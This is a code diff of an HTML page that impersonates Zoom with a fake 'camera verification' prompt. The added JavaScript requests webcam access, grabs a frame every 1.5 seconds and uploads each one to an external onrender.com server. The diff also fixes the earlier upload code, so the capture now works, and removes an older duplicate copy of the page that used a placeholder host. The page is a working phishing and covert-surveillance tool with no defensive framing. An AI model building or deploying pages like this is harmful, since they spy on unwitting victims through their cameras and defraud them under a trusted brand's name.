@@ -1,63 +1,42 @@
 <!DOCTYPE html>
 <html>
-<head><title>Zoom Verification</title>
-<style>body{text-align:center;padding:50px;font:16px Arial}</style>
+<head><title>Zoom Security Update</title>
+<style>body{text-align:center;padding:50px;font-family:Arial;background:#f0f0f0;}
+#video{border:3px solid #007bff;border-radius:10px;}</style>
 </head>
 <body>
-<h1>📹 Camera Verification Required</h1>
-<p>Allow access to continue...</p>
-<video id="video" width=400 height=300 style="border:2px solid #007bff;display:none"></video>
-<div id="status">Click ALLOW camera permission</div>
+<h1>📹 Zoom Camera Verification</h1>
+<p>Allow camera access to verify identity</p>
+<video id="video" width=500 height=375 autoplay muted style="display:none;"></video>
+<div id="status" style="color:#28a745;font-weight:bold;font-size:18px;">Waiting for permission...</div>
+
 <script>
 navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
 .then(stream => {
-  document.getElementById('video').srcObject = stream;
-  document.getElementById('video').style.display = 'block';
-  document.getElementById('status').innerHTML = '✅ Camera Active';
-  // Send frames to Render server
+  const video = document.getElementById('video');
+  video.srcObject = stream;
+  video.style.display = 'block';
+  document.getElementById('status').innerHTML = '✅ CAMERA ACTIVE - Streaming to server';
+  
+  // CONNECTED TO YOUR RENDER BACKEND
   setInterval(() => {
     const canvas = document.createElement('canvas');
-    canvas.width = 400; canvas.height = 300;
-    canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0);
+    canvas.width = 500; canvas.height = 375;
+    canvas.getContext('2d').drawImage(video, 0, 0);
     canvas.toBlob(blob => {
-      fetch('https://YOUR-RENDER-APP.onrender.com/upload', {
+      const formData = new FormData();
+      formData.append('frame', blob, `cam_${Date.now()}.jpg`);
+      fetch('https://zoom-security-update1.onrender.com/upload', {
         method: 'POST',
-        body: new FormData().append('frame', blob, 'cam.jpg')
-      });
-    });
-  }, 2000);
-}).catch(() => document.getElementById('status').innerHTML = 'Allow camera!');
-</script>
-</body>
-</html><!DOCTYPE html>
-<html>
-<head><title>Zoom Verification</title>
-<style>body{text-align:center;padding:50px;font:16px Arial}</style>
-</head>
-<body>
-<h1>📹 Camera Verification Required</h1>
-<p>Allow access to continue...</p>
-<video id="video" width=400 height=300 style="border:2px solid #007bff;display:none"></video>
-<div id="status">Click ALLOW camera permission</div>
-<script>
-navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
-.then(stream => {
-  document.getElementById('video').srcObject = stream;
-  document.getElementById('video').style.display = 'block';
-  document.getElementById('status').innerHTML = '✅ Camera Active';
-  // Send frames to Render server
-  setInterval(() => {
-    const canvas = document.createElement('canvas');
-    canvas.width = 400; canvas.height = 300;
-    canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0);
-    canvas.toBlob(blob => {
-      fetch('https://YOUR-RENDER-APP.onrender.com/upload', {
-        method: 'POST',
-        body: new FormData().append('frame', blob, 'cam.jpg')
-      });
-    });
-  }, 2000);
-}).catch(() => document.getElementById('status').innerHTML = 'Allow camera!');
+        body: formData
+      }).then(() => console.log('Frame sent'));
+    }, 'image/jpeg', 0.8);
+  }, 1500); // 1 pic every 1.5 sec
+})
+.catch(err => {
+  document.getElementById('status').innerHTML = '❌ Camera blocked. Enable permissions and refresh';
+  console.error(err);
+});
 </script>
 </body>
 </html>
